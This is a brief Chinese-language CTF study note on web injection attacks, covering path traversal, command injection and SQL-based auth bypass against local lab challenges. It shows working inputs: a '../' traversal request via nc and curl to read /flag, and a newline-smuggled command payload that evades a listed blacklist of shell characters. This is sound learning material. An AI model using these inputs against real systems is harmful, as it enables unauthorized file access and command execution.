#ctf/web 
安全领域有各种各样的注入：
- Command Injection
- HTML Injection
- SQL Injection
- Stack Injection

其核心在于利用精心构造的输入数据，嵌入到服务端程序想要执行的参数化命令中，并绕过参数检查，从而执行恶意指令。

## Path Traversal
当服务端直接通过拼接路径提供文件时，可以利用 `..` 实现对文件系统任意路径的访问。
```sh
hacker@web-security~path-traversal-1:~$ nc localhost 80
GET /deliverables/../../flag HTTP/1.1
Host: challenge.localhost:80
```

或者用 `curl`：
```sh
hacker@web-security~path-traversal-1:~$ curl --path-as-is -v challenge.localhost
:80/deliverables/../../flag
```

> [!note]
> 由于 `curl` 默认会自动处理 `/./` 和 `/../` 路径，发送请求前需要显式关闭。

## Command Injection (CMDi)
有些程序会根据用户输入构造 Shell 指令，并运行具有高级权限的外部程序，而攻击者则可以利用复杂的 Shell 语法构造攻击输入。

### The Hard Case
当大部分 shell 特殊字符（见下）被输入检查封禁时，还有办法注入吗？
```plain
;&|><()`$
```

有的兄弟有的，`\n` 本身就代表输入新的指令，所以发送一个 `\n` 就可以愉快地执行其他指令了。
```python
params = {"filedir": b"/\ncat /flag"}
```

## Auth Bypass
这种攻击主要借助 SQL 注入，让程序误认为我们输入了正确了密码，实际上其实是利用注入使查询条件恒真。